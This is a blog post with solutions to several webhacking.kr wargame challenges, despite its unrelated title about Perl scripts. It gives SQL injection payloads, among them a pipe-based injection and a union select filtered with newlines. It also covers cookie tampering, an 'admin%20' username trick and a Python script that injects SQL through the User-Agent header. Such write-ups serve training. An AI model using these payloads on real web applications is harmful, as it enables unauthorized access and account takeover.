---
layout:     post
title:      "Security Issue in perl scripts"
subtitle:   "Security flaws"
date:       2016-01-06 14:00:00
author:     "Heeraj"
header-img: "img/post-bg-02.png"
---
<p> If you like to read our old blogs you are welcome, <a href="http://heeraj123.wordpress.com">I4INFO</a> </p>

<p>For the past one week I was focusing on webhacking kr challenges, so I thought I would share the challenges solution that I was able to solve. They challenges were very, hats off to the team who had worked behind it.</p>

<p>Challenge 01</p>

<p>In the first challenge, you have to change cookie value to a number which is in between 5 and 6. In chrome you can use editmycookie or if you are using you could use firebug or any other means</p>

<p>Challenge 03</p>

<p>Its just an game which is very similar to soduku. The number gives you the count of the number of black box is possible. After clearing the you will see an input box, you may guess an sql injection. Then probably right , a simple sql injection but here you have to use pipe, that would be most difficult thing that you will take to figure out. But don't waste your time in trying sqli in input box. Try with burp suite, you can easily exploit.</p>

<blockquote>answer=1010100000011100101011111||1&id=kjkjkfd</blockquote>

<p>Challenge 04</p>

<p>The thing before you something, you recognise more, a base64 encoding. Well when you decrypt you get something 40 length character. 40 is a big clue, If you have hash identifier tool, you may have till now probably got it. Ya sha1, now try to deocde, ya you have to decode you can use some online tool hashkiller. Again you will get the 40 length character. Decode again :)</p>

<p>Challenge 05</p>

<p>In challenge5 you have both the login and join option. In join option when you click, then an alert box comes "Access Denied". When you look at the source you can see a move(),from there you can guess the location of the join(webhacking.kr/challenge/web/web-05/mem/join.php). From there you will be able to get the source code, source code may be difficult to understand. As told in the source code try to make an cookie oldzoombie as well your url should contain the required parameter mode. Then you can join, but to login as admin wouldn't be possible asthere would be one more admin. So you can use username as something as admin%20 and any pass you may like.</p>

<p>Challenge 06</p>

<p>The first part of the  php code in the index.phps would give you the encoded id and password, getting the 20 times encoded and filtered id and pass.Create a cookie.</p>

<p>Challenge 07</p>

<p>This is another sql injection, in this most of the sql statements are filtered, http://webhacking.kr/challenge/web/web-07/index.php?val=13)%0Aunion%0aselect%0a(5-3  </p>

<p>Challenge 08</p>

<blockquote>
import requests<br>
import re<br><br>

url = "http://webhacking.kr/challenge/web/web-02/index.php"<br>
var=""<br>
s = requests.Session()<br>
headers = {'user-agent': "admin','1234','admin'), ('admin"}<br>
r = s.get("http://webhacking.kr/challenge/web/web-08/" , cookies={'PHPSESSID': '7gnluf4pd8uvf06ejsrpp0dbo5'},headers=headers)<br>
res = r.text<br>
print res<br><br>

print "\nNext Request \n"<br>
s = requests.Session()<br>
headers = {'user-agent': "admin"}<br>
r = s.get("http://webhacking.kr/challenge/web/web-08/" , cookies={'PHPSESSID': '7gnluf4pd8uvf06ejsrpp0dbo5'},headers=headers)<br>
res = r.text<br>
print res<br>
</blockquote>

<p>I will come with next part of solution with in days</p>

<p>Thank you for reading the blog! </p>
